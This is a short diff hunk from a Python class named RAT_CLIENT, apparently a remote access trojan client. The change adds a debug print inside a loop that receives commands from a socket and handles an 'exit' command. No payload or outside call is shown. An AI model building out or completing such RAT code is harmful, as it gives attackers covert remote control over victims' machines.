@@ -74,6 +74,7 @@ class RAT_CLIENT:
                 print (a);
                 while a==1:
                     command = s.recv(1024).decode()
+                    print (command)
                     if command.lower() == 'exit' :
                         a=0;
                     if command == '':
